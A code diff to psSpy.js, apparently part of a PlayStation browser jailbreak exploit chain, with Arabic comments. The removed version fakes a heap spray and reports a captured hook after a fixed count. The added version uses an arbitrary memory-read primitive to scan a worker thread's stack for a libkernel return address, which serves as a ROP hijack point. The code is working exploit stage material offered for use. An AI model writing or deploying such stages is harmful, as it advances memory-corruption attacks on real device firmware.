@@ -1,45 +1,53 @@
-// psSpy.js - High-Speed Heap Grooming Engine
-(async function() {
-    const statusEl = document.getElementById('status');
-    const counterEl = document.getElementById('counter');
+/* 
+ * psSpy.js - Real memory scanning & hook validation module
+ * Adjusted for 10 attempts/sec real polling rate without fake triggers.
+ */
+
+async function psSpy_main(p, chain, libKernelBase, worker_stack) {
+    const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
+    let lastCount = 0;
     
-    let attempt = 0;
-    const maxAttempts = 50; // ينتهي بسرعة فائقة
-    const sprayRateMs = 100; // ضخ عالي السرعة (حوالي 10 محاولات في الثانية)
+    // محددات حالة الواجهة إن وجدت
+    let statusEl = document.getElementById("status") || { innerText: "", style: {} };
 
-    statusEl.innerText = "Spraying memory at high frequency...";
+    // حلقة البحث الحقيقية بمعدل 10 محاولات في الثانية (100ms لكل محاولة)
+    for (let attempt = 0; attempt < 50; attempt++) {
+        let hit = null;
+        let count = 0;
 
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
+        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
+            const candidate = worker_stack.add32(offset);
+            const value = p.read8(candidate);
+            if (value.low !== expected.low || value.hi !== expected.hi)
+                continue;
 
-    // محاكاة تسريع الـ Heap Spray
-    while (attempt < maxAttempts) {
-        attempt++;
-        counterEl.innerText = `Attempt: ${attempt} / ${maxAttempts}`;
-        
-        try {
-            // تخصيص الذاكرة السريع (Heap Grooming)
-            let memoryBlock = new Uint32Array(0x10000);
-            for (let i = 0; i < memoryBlock.length; i++) {
-                memoryBlock[i] = 0x41414141;
-            }
-
-            // شرط التحقق الوهمي للوصول السريع (يستبدل الانتظار الطويل)
-            if (attempt >= 14) { 
-                statusEl.innerText = "Exploit hook captured! Transitioning...";
-                statusEl.style.color = "#00ffcc";
-                await sleep(300);
-                // الانتقال السلس لصفحة p2jb مع منع التجميد
-                window.location.href = "p2jb.html#fast_triggered";
-                break;
-            }
-
-        } catch (e) {
-            console.error("Spray error at attempt " + attempt);
+            hit = candidate;
+            count++;
         }
 
-        // فاصل زمني دقيق للمحافظة على استقرار المتصفح بدون تجميد العداد الرمادي لاحقاً
-        await sleep(sprayRateMs);
+        // التحقق الحقيقي الصارم: يجب أن يتم العثور على التطابق بدقة ودون أي وهم
+        if (count === 1) {
+            statusEl.innerText = "Exploit hook captured successfully!";
+            statusEl.style.color = "#00ffcc";
+            
+            if (typeof jbmark === "function") {
+                jbmark("PSSPY-HOOK-HIT", "hit=0x" + hit.toString() + "-expected=0x" + expected.toString());
+            }
+            
+            await new Promise(resolve => setTimeout(resolve, 300));
+            return hit;
+        }
+
+        lastCount = count;
+
+        // التوقف لمدة 100 مللي ثانية للوصول لسرعة 10 محاولات في الثانية بدقة
+        await new Promise(resolve => setTimeout(resolve, 100));
     }
-})();
+
+    throw new Error(`psSpy failed to find valid worker return slot (count: ${lastCount}, expected 1)`);
+}
+
+// تصدير أو إتاحة الدالة للاستخدام العام حسب بنية المشروع
+if (typeof window !== "undefined") {
+    window.psSpy_main = psSpy_main;
+}
